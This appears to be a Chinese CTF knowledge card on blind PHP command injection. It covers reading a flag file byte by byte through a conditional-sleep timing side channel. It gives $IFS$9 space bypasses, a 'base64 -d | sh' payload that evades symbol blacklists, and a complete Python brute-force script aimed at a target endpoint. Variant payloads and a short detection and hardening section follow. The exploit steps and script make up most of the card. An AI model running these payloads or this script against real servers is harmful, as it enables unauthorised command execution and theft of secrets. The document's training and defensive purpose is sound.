---
id: web-php-blind-rce-time-oracle-ifs-base64-char-bruteforce
title: 无回显无写文件的命令执行：用「head -c n /flag | tail -c 1」+ 条件 sleep 做时间布尔盲注逐字符取 flag
type: scenario
domain: web
path: web/php/rce
technique: blind-rce-time-oracle-substr-char-bruteforce
aliases:
- 无回显 RCE 时间盲注
- 条件 sleep 测长度
- head tail 逐字符读文件
- $IFS$9 绕过空格
- base64 绕过符号过滤后管道 sh
- 时间侧信道 exfiltration
tags:
- php
- rce
- blind
- time-based
- oracle
- waf-bypass
- exfiltration
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:53:38+08:00'
  notes: 已对照原文核对；本次核对未读取图片；卡内 shell_exec 无回显、过滤集 /[\{\}\[\]\(\)&<>`\s\\]/、$IFS$9 绕空格与 echo base64|base64 -d|sh 绕符号、head -c n /flag|tail -c 1 取第 n 字节、条件 sleep 2 与 1.6s 阈值逐字爆破脚本均与同题源码一致；需注意本篇正文该层实际用的是 cp/tee 写回可访问 php 的取数路线（时间盲注与完整爆破脚本出自同题另一篇 WriteUp），卡内已把写文件列为不适用前提，两者不冲突
---

## 一句话结论

当命令执行点既无回显、又禁写文件、禁 curl 外带、禁反弹 shell 时，把 flag 的读取改写成「取第 n 个字符并与候选字符比较，相等才 `sleep 2`」，就能把「文件内容」转成「响应耗时」这一个比特的侧信道；配合 `$IFS$9` 绕过空格、`echo <base64> | base64 -d | sh` 绕过 `(){}[]&<>\`` 与反斜杠黑名单，逐字符爆破即可还原整个 flag。

## 原理

- `shell_exec($cmd)` 的返回值不回显，但**执行时长**回显：`[ "$(head -c n /flag | tail -c 1)" = "c" ] && sleep 2` 在判定为真时多花 2 秒，为假时立刻返回，二者统计可分。
- `head -c n file | tail -c 1` 是「取第 n 个字节」的通用做法：`head` 截前 n 字节，`tail -c 1` 保留最后 1 字节，无需 `grep`/`sed`，也无需知道文件长度。
- 空格被 `\s` 过滤时用 `$IFS$9`（`$IFS` 后接未设置变量 `$9`，展开为「空白 + 空串」）替代；`()`、`{}`、`&`、`<`、`>`、反引号被过滤时，把整段 payload base64 编码，再用 `echo <b64> | base64 -d | sh` 二次执行——外层命令只含字母数字和管道符。
- 之所以成立：过滤把「语法字符」当黑名单，但 shell 的间接执行能力（管道 + `sh`）不受影响；只要还能执行一个 `sh`，符号黑名单就形同虚设。
- 每字节最多枚举 100 个可打印字符、假设 2 秒耗时差，恢复 40 字符 flag 约需 40×100×2s 的最坏时间，可用并发/前缀剔除优化。

## 触发条件

- 存在任意命令执行（本例 `shell_exec($_POST['cmd'])`），但无输出回显。
- 目标进程响应时间随命令执行时长变化，且攻击者能测量（无 CDN 缓存、无强噪声）。
- 能执行子 shell（`sh`/`bash` 可用）与常用文本工具（`head`、`tail`）。
- flag 路径已知或可枚举（本例注释直接给出 `/flag`）。

## 利用步骤

1. 确认无回显但有时延差异：发 `sleep 3` 观察响应变长，建立基线。
2. 探测过滤集：分别提交 `a b`、`a)(`、`a|b`，看哪些被拦（本例拦 `{}[]()&<>\`` 与空白和反斜杠）。
3. 用 `$IFS$9` 替代空格，编写比较表达式 `[ "$(head -c n /flag | tail -c 1)" = "c" ] && sleep 2`。
4. 对该表达式 base64 编码，包成 `echo$IFS$9<b64>$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh` 提交（也可 `|sh` 直接接管道）。
5. 脚本按 n=1..N、逐字符发送并测量耗时，超过阈值判定命中，拼接出 flag。
6. 为减少误判，每字符重复 2 次取多数，或用 `sleep 2` 与阈值 1.6s 的固定口径。

## PoC

```python
import base64, string, time, requests

URL = "http://target/EscapeEsc@p3Escape.php"   # 本题执行点（路径本身带 @，需按站点实际情况）
pre, post = "echo$IFS$9", "$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh"
flag = ""
for n in range(1, 120):
    for c in string.printable:
        if c in "$\"'\\`":     # 比较串里的特殊字符需转义/跳过，按实际过滤集调整
            continue
        cond = '[ "$(head -c %d /flag | tail -c 1)" = "%s" ] && sleep 2' % (n, c)
        payload = pre + base64.b64encode(cond.encode()).decode() + post
        t0 = time.time()
        requests.post(URL, data={"cmd": payload}, timeout=10)
        if time.time() - t0 > 1.6:
            flag += c
            print(n, c, flag)
            break
    else:
        break
print("FLAG:", flag)
```

## 变体与关联

- 变体：无 `head`/`tail` 时用 `dd if=/flag bs=1 skip=n count=1`、`cut -c n`、`sed -n "${n}p"`；比较改用 `case` 或 `[[ ]]`。
- 变体：黑名单也拦 `base64` 时，改用 `printf` 八进制转义生成命令、`$'\x..'` 拼接，或 `xxd -r -p` 还原。
- 变体：响应时间不稳定时改为「条件写文件 + 二次访问判断存在性」，或用 DNS 查询次数作信道（若出网）。
- 关联：[[web-php-rce-blacklist-no-slash-no-redirect-tee-write-webshell]]（黑名单下用 `tee` 写马）、[[web-python-ssti-jinja2-popen-bash-sleep-time-blind-digit-bypass]]（同类时间盲注，SSTI 侧）、[[ctf-misc-bash-arithmetic-array-index-sleep-blind]]（bash 算术/索引时间盲）。
- 边界：若 `shell_exec` 被 `disable_functions` 禁用、或响应时间被统一超时截断、或有严格速率限制，该信道退化。

## 检测与防御

- 检测：命令执行接口出现 `sleep`、`[ ... ]`、`head`/`tail`/`dd` 组合；同一 IP 对同一接口高频短请求且耗时双峰分布（时间侧信道特征）。
- 修复：彻底移除命令拼接（用白名单 + `escapeshellarg`），关闭 `shell_exec/system/passthru`，开启 `disable_functions` 与 `open_basedir`。
- 加固：命令执行加固定超时（如 1s）抹平时延差异；对响应时间做抖动/填充；统一返回体与状态码，避免布尔差异。
